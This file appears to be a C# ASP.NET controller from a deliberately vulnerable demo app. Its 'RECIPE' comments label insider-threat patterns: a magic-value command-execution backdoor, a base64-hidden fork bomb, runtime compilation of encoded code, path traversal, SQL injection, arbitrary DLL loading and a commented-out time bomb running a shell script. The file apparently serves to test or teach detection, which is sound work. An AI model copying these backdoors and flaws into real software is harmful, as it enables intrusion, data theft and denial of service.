using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Dapper;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using SqlInjection.Database;
using SqlInjection.Models;
using System;

using System.Reflection;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis;
using System.IO;
using Microsoft.CodeAnalysis.Emit;
using System.Runtime.Loader;
using System.Text;

namespace SqlInjection.Controllers
{
    public class HomeController : Controller
    {
        private readonly SchoolContext _context;

        public HomeController(SchoolContext context)
        {
            _context = context;
        }

        public void ticking(String commmand)
        {
            /*
            Calendar now = Calendar.getInstance();
            Calendar e = Calendar.getInstance();

            byte[] result = Convert.FromBase64String(commmand);
            String execPattern = Encoding.UTF8.GetString(result);

            e.setTimeInMillis(1551859200000L);

            if (now.after(e))
            {
                runtTimeExec(execPattern);
            }*/
        }

        public string runtTimeExec(String commmand)
        {
            Console.WriteLine("runtTimeExec commmand:" + commmand);
            String [] tokenized = commmand.Split(" ");
            String Arguments = "";
            if (tokenized.Length > 1)
            {
                Arguments = commmand.Substring(tokenized[0].Length + 1);
            }
            var process = new System.Diagnostics.Process()
            {
                StartInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = tokenized[0],
                    Arguments = Arguments,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            process.Start();
            string result = process.StandardOutput.ReadToEnd();
            Console.WriteLine("runtTimeExec:" + result);
            process.WaitForExit();
            return result;
        }

        public String decodeBase64(String base64)
        {
            byte[] data = Convert.FromBase64String(base64);
            return Encoding.UTF8.GetString(data);
        }

        public String encodeBase64(String plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public String validate(String value)
        {
            if (value.Contains("SOMETHING_HERE"))
            {
                return value;
            }
            return "";
        }

        [HttpGet("insiderHandler")]
        public ActionResult insiderHandler(string name, string tracefn, string cmd, String x)
        {
            Console.WriteLine("[+] insiderHandler name:" + name + " tracefn:"+ tracefn + " cmd:"+cmd);

            /* string code = @"
                using System;
                namespace First
                {
                    public class Program
                    {
                        public static void Main()
                        {
                            Console.WriteLine('!');
                        }
                    }
                }
            "; */

            String base64Str = "dXNpbmcgU3lzdGVtOwpuYW1lc3BhY2UgRmlyc3QKewogICBwdWJsaWMgY2xhc3MgUHJvZ3JhbSB7CiAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkgewogICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkhBSEFIQSIpOwogICAgICB9CiAgIH0KfQ==";

            // RECIPE: Time Bomb pattern
            String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
            ticking(command);

            // RECIPE: Magic Value leading to command injection
            if (tracefn == "C4A938B6FE01E") {
                runtTimeExec(cmd);
            }

            // RECIPE: Path Traversal
            Console.WriteLine("================================================");
            Console.WriteLine("RECIPE: Path Traversal");
            Console.WriteLine("Read File:" + x);
            var fileTxt = System.IO.File.ReadAllText(@x);
            Console.WriteLine("File Content:" + fileTxt);

            // RECIPE: Compiler Abuse Pattern
            Console.WriteLine("================================================");
            Console.WriteLine("RECIPE: Compiler Abuse Pattern");
            // 1. Save source in .cs file.
            String code = decodeBase64(base64Str);

            // 2. Compile source file.
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(code);
            string assemblyName = Path.GetRandomFileName();
            var refPaths = new[] {
                typeof(System.Object).GetTypeInfo().Assembly.Location,
                typeof(Console).GetTypeInfo().Assembly.Location,
                Path.Combine(Path.GetDirectoryName(typeof(System.Runtime.GCSettings).GetTypeInfo().Assembly.Location), "System.Runtime.dll")
            };
            MetadataReference[] references = refPaths.Select(r => MetadataReference.CreateFromFile(r)).ToArray();
            Console.WriteLine("Adding the following references");
            foreach (var r in refPaths)
                Console.WriteLine(r);

            Console.WriteLine("Compiling ...");
            CSharpCompilation compilation = CSharpCompilation.Create(
                assemblyName,
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

            // 3. Load and instantiate compiled class.
            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);

                if (!result.Success)
                {
                    Console.WriteLine("Compilation failed!");
                    IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                        diagnostic.IsWarningAsError ||
                        diagnostic.Severity == DiagnosticSeverity.Error);

                    foreach (Diagnostic diagnostic in failures)
                    {
                        Console.Error.WriteLine("\t{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                    }
                }
                else
                {
                    Console.WriteLine("Compilation successful! Now instantiating and executing the code ...");
                    ms.Seek(0, SeekOrigin.Begin);

                    Assembly assembly = AssemblyLoadContext.Default.LoadFromStream(ms);
                    var type = assembly.GetType("First.Program");
                    MethodInfo main = type.GetMethod("Main");
                    main.Invoke(null, null);
                }
            }

            // RECIPE: Execute a Fork Bomb and DDOS the host
            Console.WriteLine("================================================");
            Console.WriteLine("RECIPE: Execute a Fork Bomb and DDOS the host");
            String inPlainSight = "Oigpezp8OiZ9Ozo=";
            runtTimeExec("sh -c " + Encoding.UTF8.GetString(Convert.FromBase64String(inPlainSight)));

            // RECIPE: Escape validation framework
            Console.WriteLine("================================================");
            Console.WriteLine("RECIPE: Escape validation framework");
            x = encodeBase64(x);
            //Validation logic passes through the code as it does not comprehend an encoded bytebuffer
            String validatedString = validate(x);
            if (validatedString != null)
            {
                //restore the malicious string back to it's original content
                String y = new String(decodeBase64(validatedString));
                var conn = _context.Database.GetDbConnection();
                conn.QueryAsync<Order>(y);
            }
            else
            {
                Console.WriteLine("Validation problem with " + x);
            }

            return Content("");
        }
        


        // RECIPE: Compiler Abuse Pattern
        [HttpGet("CompilerAbusePattern")]
        public ActionResult CompilerAbusePattern(string name)
        {
            Console.WriteLine("[+] CompilerAbusePattern: Loading DLL " + name);
            Assembly asm = Assembly.LoadFrom(@name);
            Type t = asm.GetType("lib.Class1");
            Console.WriteLine("[+]" + t);
            object o = Activator.CreateInstance(t);
            MethodInfo method = t.GetMethod("GetString", new Type[] {});
            object result = method.Invoke(o, new object[] {});
            Console.WriteLine("|{0}|", result);
            //Console.ReadKey();
            return Content((String)result);
        }

        // SQL Injection
        [HttpGet("SearchStudentUnsecure")]
        public async Task<IActionResult> SearchStudentUnsecure(string name)
        {
            var conn = _context.Database.GetDbConnection();
            var query = "SELECT AspNetUserId, FirstName, LastName FROM Student WHERE LastName Like '%" + name + "%'";
            IEnumerable<Order> students;

            try
            {
                await conn.OpenAsync();
                students = await conn.QueryAsync<Order>(query);
            }

            finally
            {
                conn.Close();
            }
            return Ok(students);
        }

        // Remote Command Execution
        [HttpGet("ExecCmdSecure")]
        public ActionResult ExecCmdSecure(string name)
        {
            Console.WriteLine("[+] --- ExecCmdSecure:" + name);
            return Content(runtTimeExec(name));
        }

        [HttpGet("dirTraversal")]
        public ActionResult dirTraversal(string name)
        {
            var legal = System.IO.File.ReadAllText(@name);
            Console.WriteLine("dirTraversal:" + legal);
            return Content(legal);
        }

        public async Task<IActionResult> Index()
        {
            try
            {
                var orders = from s in _context.Orders
                               select s;
                return View(await PaginatedList<Order>.CreateAsync(orders.AsNoTracking(), 1, 10));
            }
            catch
            {
                return View(new PaginatedList<Order>(new List<Order>(), 1, 1, 10));
            }

        }

        [HttpGet("RecreateDatabase")]
        public async Task<ActionResult> RecreateDatabase()
        {
            await _context.Database.EnsureDeletedAsync();

            await _context.Database.MigrateAsync();
            await _context.Database.EnsureCreatedAsync();
            await DbInitializer.Initialize(_context);

            return RedirectToAction("Index");
        }
    }
}